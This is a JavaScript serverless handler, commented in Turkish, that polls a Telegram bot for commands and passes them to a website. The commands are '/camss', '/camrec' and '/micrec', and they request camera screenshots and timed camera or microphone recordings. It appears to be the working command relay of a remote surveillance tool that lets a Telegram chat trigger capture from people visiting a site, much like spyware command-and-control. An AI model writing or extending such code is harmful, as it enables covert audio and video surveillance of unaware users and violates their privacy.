// 🤖 Telegram Bot Command Polling API
// Bu fonksiyon site tarafından çağrılır ve Telegram bot'tan yeni komutları alır
// Komutlar: /camss, /camrec X, /micrec X

const TELEGRAM_API_URL = 'https://api.telegram.org/bot';

// Son işlenen update ID'yi saklama (Map - her chat için ayrı)
const lastUpdateIds = new Map();

export default async function handler(req, res) {
    // CORS headers
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    if (req.method !== 'GET' && req.method !== 'POST') {
        return res.status(405).json({ success: false, error: 'Method not allowed' });
    }

    try {
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const allowedChatId = process.env.TELEGRAM_CHAT_ID;

        if (!botToken || !allowedChatId) {
            return res.status(500).json({ success: false, error: 'Server configuration error' });
        }

        // Her chat için son update ID'yi al
        const lastUpdateId = lastUpdateIds.get(allowedChatId) || 0;

        // Telegram'dan son mesajları al (getUpdates)
        const telegramUrl = `${TELEGRAM_API_URL}${botToken}/getUpdates?offset=${lastUpdateId + 1}&limit=10&timeout=0`;
        const telegramResponse = await fetch(telegramUrl);
        const telegramData = await telegramResponse.json();

        if (!telegramData.ok) {
            return res.status(500).json({ success: false, error: 'Telegram API error' });
        }

        const updates = telegramData.result;

        // Komutları filtrele (sadece izin verilen chat ID'den)
        const commands = [];
        let newLastUpdateId = lastUpdateId;
        
        for (const update of updates) {
            if (update.message && update.message.text) {
                const chatId = update.message.chat.id.toString();
                const text = update.message.text.trim();

                // Sadece izin verilen chat ID'den gelen komutları kabul et
                if (chatId === allowedChatId) {
                    // Komut kontrolü
                    if (text === '/camss') {
                        commands.push({
                            command: 'camera_screenshot',
                            params: null,
                            message_id: update.message.message_id
                        });
                    } else if (text.startsWith('/camrec')) {
                        // /camrec35, /camrec 35 veya /camrec (default 5) - Min 1s, Max 30s
                        const match = text.match(/\/camrec\s*(\d+)?/);
                        const duration = match && match[1] ? parseInt(match[1]) : 5;
                        commands.push({
                            command: 'camera_record',
                            params: { duration: Math.max(1, Math.min(duration, 30)) }, // Min 1, Max 30 saniye
                            message_id: update.message.message_id
                        });
                    } else if (text.startsWith('/micrec')) {
                        // /micrec35, /micrec 35 veya /micrec (default 5) - Min 1s, Max 30s
                        const match = text.match(/\/micrec\s*(\d+)?/);
                        const duration = match && match[1] ? parseInt(match[1]) : 5;
                        commands.push({
                            command: 'microphone_record',
                            params: { duration: Math.max(1, Math.min(duration, 30)) }, // Min 1, Max 30 saniye
                            message_id: update.message.message_id
                        });
                    }
                }

                // En son update ID'yi güncelle
                if (update.update_id > newLastUpdateId) {
                    newLastUpdateId = update.update_id;
                }
            }
        }

        // LastUpdateId'yi kaydet (bir sonraki request için)
        if (newLastUpdateId > lastUpdateId) {
            lastUpdateIds.set(allowedChatId, newLastUpdateId);
        }

        return res.status(200).json({
            success: true,
            commands: commands,
            count: commands.length
        });

    } catch (error) {
        console.error('Error in get-commands:', error);
        return res.status(500).json({
            success: false,
            error: 'Internal server error',
            message: error.message
        });
    }
}

